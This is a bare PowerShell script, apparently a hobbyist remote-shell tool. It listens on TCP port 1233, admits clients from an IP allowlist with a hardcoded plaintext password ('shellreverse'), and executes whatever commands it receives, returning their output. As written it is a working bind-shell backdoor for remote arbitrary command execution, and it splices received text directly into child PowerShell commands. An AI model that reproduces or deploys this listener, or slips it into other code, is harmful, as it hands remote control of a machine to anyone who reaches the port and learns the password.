$port = 1233
$listener = [System.Net.Sockets.TcpListener]::new(
    [System.Net.IPAddress]::Any,
    $port
)
$listener.Start()
Write-Host "Listening on port $port"

while ($true) {
    $client = $listener.AcceptTcpClient()
    

    $rs = [RunspaceFactory]::CreateRunspace()
    $rs.Open()

    $ps = [PowerShell]::Create()
    $ps.Runspace = $rs

    $ps.AddScript({
        param($client)

        $ip = $client.Client.RemoteEndPoint.Address.ToString()

        $stream = $client.GetStream()
        $buffer = New-Object byte[] 5096

        # per-client state
        $cwd = (Get-Location).Path

        function Send($text) {
            if ([string]::IsNullOrEmpty($text)) {
                $text = "Server Recived Null`n"
            }
            $text += "`n<END>`n"
            $bytes = [Text.Encoding]::ASCII.GetBytes($text)
            $stream.Write($bytes, 0, $bytes.Length)
        }

        $allowed = @("127.0.0.1", "192.168.1.121")


        if ($ip -notin $allowed) {
            Send "Away Away now"
            exit
        }

        $passBuf = New-Object byte[] 1024

        $sendBytes = [Text.Encoding]::ASCII.GetBytes("Password!")
        $stream.Write($sendBytes, 0, $sendBytes.Length)

        $readAmmt = $stream.Read($passBuf, 0, $passBuf.Length)
        $sendPass = [Text.Encoding]::ASCII.GetString($passBuf, 0, $readAmmt)

        if ($sendPass -ne "shellreverse") {
            Send "Wrong Pass LEAVE"
            exit
        }


        try {

            while ($true) {
                $bytesRead = $stream.Read($buffer,0,$buffer.Length)
                if ($bytesRead -eq 0) { break }

                $cmd = ([Text.Encoding]::ASCII.GetString(
                    $buffer,0,$bytesRead
                )).Trim()

                if ($cmd -eq "exit") {
                    Send "bye"
                    break
                }


                # ---- HANDLE CD ----
                # ^ -> start of string
                # \s* -> whitespace 0 or more times
                # (.*) -> any char (.) 0 or more times
                # $ -> nothing allowed after above
                if ($cmd -match '^cd\s*(.*)$') {
                    $target = $matches[1]

                    try {
                        if ([string]::IsNullOrEmpty($target)) {
                            $cwd = $env:USERPROFILE
                        } else {
                            $new = Resolve-Path -Path (Join-Path $cwd $target)
                            $cwd = $new.Path
                        }
                        Send "CWD: $cwd"
                    }
                    catch {
                        Send $_.Exception.Message
                    }
                    continue
                }

                # ---- RUN COMMAND ----

                try {
                        $output = powershell -NoProfile -Command "
                        Set-Location '$cwd';
                        $cmd
                        " 2>&1 | Out-String

                    
                    Send $output
                }
                catch {
                    Send $_.Exception.Message
                }
            }
        }
        finally {
            $stream.Close()
            $client.Close()
        }
    }).AddArgument($client)

    $ps.BeginInvoke()
}
